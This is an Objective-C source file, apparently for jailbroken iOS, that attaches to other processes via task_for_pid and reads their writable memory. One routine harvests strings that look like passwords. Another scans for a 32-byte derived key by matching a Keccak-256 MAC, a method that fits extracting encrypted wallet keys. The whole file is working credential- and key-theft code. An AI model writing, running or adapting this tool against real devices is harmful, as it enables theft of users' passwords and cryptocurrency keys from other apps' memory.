#import "MemScan.h"
#import <mach/mach.h>
#import <mach/vm_region.h>
#import <mach/vm_map.h>
#import <unistd.h>
#import <string.h>
#import "Keccak.h"

extern int proc_listallpids(void *buffer, int buffersize);
extern int proc_pidpath(int pid, void *buffer, uint32_t buffersize);
// iOS 没有 mach_vm.h，用 64 位段版本
extern kern_return_t vm_region_64(vm_map_t target_task, vm_address_t *address,
                                  vm_size_t *size, vm_region_flavor_t flavor,
                                  vm_region_info_t info, mach_msg_type_number_t *infoCnt,
                                  mach_port_t *object_name);
extern kern_return_t vm_read_overwrite(vm_map_t target_task, vm_address_t address,
                                       vm_size_t size, vm_address_t data, vm_size_t *outsize);

@interface MemScan ()
+ (BOOL)looksLikePassword:(NSString *)s;
@end

@implementation MemScan

+ (pid_t)pidOfExecutableContaining:(NSString *)needle {
    if (!needle.length) return 0;
    pid_t want = 0;
    pid_t *pids = (pid_t *)malloc(sizeof(pid_t) * 4096);
    if (!pids) return 0;
    int n = proc_listallpids(pids, sizeof(pid_t) * 4096);
    char path[4096];
    for (int i = 0; i < n; i++) {
        pid_t p = pids[i];
        if (p <= 0) continue;
        memset(path, 0, sizeof(path));
        if (proc_pidpath(p, path, sizeof(path)) <= 0) continue;
        NSString *s = [NSString stringWithUTF8String:path];
        if (s && [s rangeOfString:needle options:NSCaseInsensitiveSearch].location != NSNotFound) {
            want = p;
            break;
        }
    }
    free(pids);
    return want;
}

+ (NSDictionary *)regionSummaryForPid:(pid_t)pid {
    if (pid <= 0) return @{ @"error": @"bad pid" };

    mach_port_t task = MACH_PORT_NULL;
    if (task_for_pid(mach_task_self(), pid, &task) != KERN_SUCCESS || task == MACH_PORT_NULL) {
        return @{ @"error": @"task_for_pid failed" };
    }

    NSUInteger regions = 0, rwRegions = 0;
    unsigned long long total = 0, rwTotal = 0;

    vm_address_t addr = 0;
    while (YES) {
        vm_size_t size = 0;
        vm_region_basic_info_data_64_t info;
        mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
        mach_port_t object = MACH_PORT_NULL;

        kern_return_t kr = vm_region_64(task, &addr, &size, VM_REGION_BASIC_INFO_64,
                                          (vm_region_info_t)&info, &count, &object);
        if (kr != KERN_SUCCESS) break;
        if (object != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), object);
        if (size == 0) break;

        regions++;
        total += size;
        if ((info.protection & VM_PROT_READ) && (info.protection & VM_PROT_WRITE)) {
            rwRegions++;
            rwTotal += size;
        }
        addr += size;
    }

    mach_port_deallocate(mach_task_self(), task);
    return @{ @"regions": @(regions), @"rwRegions": @(rwRegions),
              @"bytes": @(total), @"rwBytes": @(rwTotal) };
}

+ (NSDictionary *)harvestStringsFromPid:(pid_t)pid
                               maxBytes:(NSUInteger)maxBytes
                               maxCands:(NSUInteger)maxCands {
    if (pid <= 0) return @{ @"error": @"bad pid", @"candidates": @[] };

    mach_port_t task = MACH_PORT_NULL;
    kern_return_t tk = task_for_pid(mach_task_self(), pid, &task);
    if (tk != KERN_SUCCESS || task == MACH_PORT_NULL) {
        return @{ @"error": [NSString stringWithFormat:@"task_for_pid kr=%d", tk],
                  @"candidates": @[] };
    }

    NSMutableSet<NSString *> *set = [NSMutableSet set];
    NSUInteger scanned = 0;
    NSUInteger regionCount = 0;
    const size_t CHUNK = 2 * 1024 * 1024;
    uint8_t *buf = (uint8_t *)malloc(CHUNK);

    if (!buf) {
        mach_port_deallocate(mach_task_self(), task);
        return @{ @"error": @"malloc failed", @"candidates": @[] };
    }

    vm_address_t addr = 0;
    while (YES) {
        if (scanned >= maxBytes || set.count >= maxCands) break;

        vm_size_t size = 0;
        vm_region_basic_info_data_64_t info;
        mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
        mach_port_t object = MACH_PORT_NULL;

        kern_return_t kr = vm_region_64(task, &addr, &size, VM_REGION_BASIC_INFO_64,
                                          (vm_region_info_t)&info, &count, &object);
        if (kr != KERN_SUCCESS) break;
        if (object != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), object);
        if (size == 0) break;

        // 只扫可读写、大小合理的区（堆/数据段）
        BOOL rw = (info.protection & VM_PROT_READ) && (info.protection & VM_PROT_WRITE);
        if (rw && size <= (768ULL * 1024 * 1024)) {
            regionCount++;
            vm_address_t cur = addr;
            vm_address_t end = addr + size;

            while (cur < end && scanned < maxBytes && set.count < maxCands) {
                vm_size_t want = (vm_size_t)CHUNK;
                if ((vm_size_t)(end - cur) < want) want = (vm_size_t)(end - cur);

                vm_size_t got = 0;
                kern_return_t r2 = vm_read_overwrite(task, cur, want,
                                                          (vm_address_t)buf, &got);
                if (r2 == KERN_SUCCESS && got > 0) {
                    scanned += got;

                    NSUInteger runStart = 0;
                    BOOL inRun = NO;
                    for (NSUInteger i = 0; i < got; i++) {
                        uint8_t c = buf[i];
                        BOOL printable = (c >= 0x20 && c <= 0x7e);
                        if (printable) {
                            if (!inRun) { runStart = i; inRun = YES; }
                        } else if (inRun) {
                            NSUInteger len = i - runStart;
                            if (len >= 6 && len <= 32) {
                                NSString *s = [[NSString alloc]
                                    initWithBytes:buf + runStart
                                           length:len
                                         encoding:NSASCIIStringEncoding];
                                if (s && [self looksLikePassword:s]) {
                                    [set addObject:s];
                                }
                            }
                            inRun = NO;
                            if (set.count >= maxCands) break;
                        }
                    }
                    // 缓冲区末尾残留的 run
                    if (inRun && set.count < maxCands) {
                        NSUInteger len = got - runStart;
                        if (len >= 6 && len <= 32) {
                            NSString *s = [[NSString alloc]
                                initWithBytes:buf + runStart
                                       length:len
                                     encoding:NSASCIIStringEncoding];
                            if (s && [self looksLikePassword:s]) [set addObject:s];
                        }
                    }
                }
                cur += want;
            }
        }
        addr += size;
    }

    free(buf);
    mach_port_deallocate(mach_task_self(), task);

    return @{ @"candidates": set.allObjects,
              @"scannedBytes": @(scanned),
              @"regions": @(regionCount) };
}

/// 粗过滤：密码一般是字母数字（可带少量符号），排除路径/JSON/标识符
+ (BOOL)looksLikePassword:(NSString *)s {
    if (s.length < 6 || s.length > 32) return NO;

    // 只排除明显不是密码的东西：路径、URL、类名、JSON 片段
    if ([s hasPrefix:@"/"] || [s hasPrefix:@"http"] || [s hasSuffix:@".dylib"]) return NO;
    if ([s containsString:@".framework"] || [s containsString:@".app"]) return NO;
    if ([s containsString:@"/"] || [s containsString:@":"]) return NO;
    if ([s containsString:@"{"] || [s containsString:@"}"] || [s containsString:@"="]) return NO;

    NSCharacterSet *ok = [NSCharacterSet characterSetWithCharactersInString:
                          @"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=.,<>?~`|"];
    if ([s rangeOfCharacterFromSet:[ok invertedSet]].location != NSNotFound) return NO;

    // 至少 4 个字母（排除 111111 / ---- 这类）
    NSUInteger alpha = 0;
    for (NSUInteger i = 0; i < s.length; i++) {
        unichar c = [s characterAtIndex:i];
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')) alpha++;
    }
    if (alpha < 4) return NO;

    // 说明：之前排除了「纯字母且长度 >10」，这会漏掉 abcdefghij 这种密码，现在取消
    return YES;
}


/// 诊断：列出可执行路径里含 needle 的进程（返回 "pid:path"）
+ (NSArray<NSString *> *)processPathsMatching:(NSString *)needle limit:(NSUInteger)limit {
    NSMutableArray *out = [NSMutableArray array];
    pid_t *pids = (pid_t *)malloc(sizeof(pid_t) * 4096);
    if (!pids) return out;
    int n = proc_listallpids(pids, sizeof(pid_t) * 4096);
    char path[4096];
    for (int i = 0; i < n && out.count < limit; i++) {
        pid_t p = pids[i];
        if (p <= 0) continue;
        memset(path, 0, sizeof(path));
        if (proc_pidpath(p, path, sizeof(path)) <= 0) continue;
        NSString *s = [NSString stringWithUTF8String:path];
        if (!s) continue;
        if (needle.length &&
            [s rangeOfString:needle options:NSCaseInsensitiveSearch].location == NSNotFound) continue;
        [out addObject:[NSString stringWithFormat:@"%d:%@", p, s]];
    }
    free(pids);
    return out;
}

#pragma mark - 直接找派生密钥（不爆破）

/// hex 字符串 → NSData
static NSData *HexToData(NSString *hex);

+ (NSData *)dataFromHex:(NSString *)hex { return HexToData(hex); }

static NSData *HexToData(NSString *hex) {
    NSString *s = [hex stringByReplacingOccurrencesOfString:@"0x" withString:@""];
    s = [s stringByReplacingOccurrencesOfString:@" " withString:@""];
    if (s.length % 2) return nil;
    NSMutableData *d = [NSMutableData dataWithCapacity:s.length / 2];
    for (NSUInteger i = 0; i + 1 < s.length; i += 2) {
        unsigned int b = 0;
        sscanf([[s substringWithRange:NSMakeRange(i, 2)] UTF8String], "%x", &b);
        uint8_t x = (uint8_t)b;
        [d appendBytes:&x length:1];
    }
    return d;
}

+ (NSDictionary *)findDerivedKeyInPid:(pid_t)pid
                               cipher:(NSData *)cipher
                                  mac:(NSData *)mac
                            saltAscii:(NSString *)saltAscii
                             maxBytes:(NSUInteger)maxBytes {
    if (pid <= 0 || cipher.length == 0 || mac.length != 32) {
        return @{ @"found": @NO, @"error": @"bad args" };
    }

    mach_port_t task = MACH_PORT_NULL;
    if (task_for_pid(mach_task_self(), pid, &task) != KERN_SUCCESS || !task) {
        return @{ @"found": @NO, @"error": @"task_for_pid failed" };
    }

    const uint8_t *ciph = cipher.bytes;
    size_t clen = cipher.length;
    uint8_t wantMac[32];
    memcpy(wantMac, mac.bytes, 32);

    const size_t CHUNK = 4 * 1024 * 1024;
    const size_t OVERLAP = 32;
    uint8_t *buf = malloc(CHUNK + OVERLAP);
    if (!buf) {
        mach_port_deallocate(mach_task_self(), task);
        return @{ @"found": @NO, @"error": @"malloc failed" };
    }

    NSData *saltData = saltAscii.length ? [saltAscii dataUsingEncoding:NSUTF8StringEncoding] : nil;
    NSUInteger scanned = 0;
    NSUInteger regionCount = 0;
    NSData *foundKey = nil;

    // 两轮：第一轮只看「含 salt 字符串」的区域（加密参数就在那儿），第二轮全扫
    for (int pass = 0; pass < 2 && !foundKey; pass++) {
        mach_vm_address_t addr = 0;
        while (YES) {
            if (foundKey) break;
            if (scanned >= maxBytes) break;

            mach_vm_size_t size = 0;
            vm_region_basic_info_data_64_t info;
            mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
            mach_port_t object = MACH_PORT_NULL;
            kern_return_t kr = vm_region_64(task, (vm_address_t *)&addr, (vm_size_t *)&size,
                                            VM_REGION_BASIC_INFO_64,
                                            (vm_region_info_t)&info, &count, &object);
            if (kr != KERN_SUCCESS) break;
            if (object != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), object);
            if (size == 0) break;

            BOOL rw = (info.protection & VM_PROT_READ) && (info.protection & VM_PROT_WRITE);
            if (rw && size <= (768ULL * 1024 * 1024)) {
                regionCount++;
                vm_address_t cur = (vm_address_t)addr;
                vm_address_t end = (vm_address_t)(addr + size);

                while (cur < end && !foundKey && scanned < maxBytes) {
                    vm_size_t want = (vm_size_t)CHUNK;
                    if ((vm_size_t)(end - cur) < want) want = (vm_size_t)(end - cur);

                    vm_size_t got = 0;
                    kern_return_t r2 = vm_read_overwrite(task, cur, want,
                                                          (vm_address_t)buf, &got);
                    if (r2 == KERN_SUCCESS && got > 64) {
                        scanned += got;

                        // 第一轮跳过不含 salt 的区域
                        BOOL candidateRegion = (pass == 1);
                        if (!candidateRegion && saltData) {
                            candidateRegion = memmem(buf, got, saltData.bytes, saltData.length) != NULL;
                        } else if (!candidateRegion) {
                            candidateRegion = YES;
                        }
                        if (!candidateRegion) { cur += want; continue; }

                        // 8 字节对齐滑动 32 字节窗口
                        for (size_t off = 0; off + 32 <= got; off += 8) {
                            uint8_t digest[32];
                            keccak256_two(buf + off + 16, 16, ciph, clen, digest);
                            if (memcmp(digest, wantMac, 32) == 0) {
                                foundKey = [NSData dataWithBytes:buf + off length:32];
                                break;
                            }
                        }
                    }
                    cur += want;
                }
            }
            addr += size;
        }
    }

    free(buf);
    mach_port_deallocate(mach_task_self(), task);

    NSMutableDictionary *out = [NSMutableDictionary dictionary];
    out[@"found"] = @(foundKey != nil);
    out[@"scannedBytes"] = @(scanned);
    out[@"regions"] = @(regionCount);
    if (foundKey) out[@"key"] = foundKey;
    return out;
}
@end
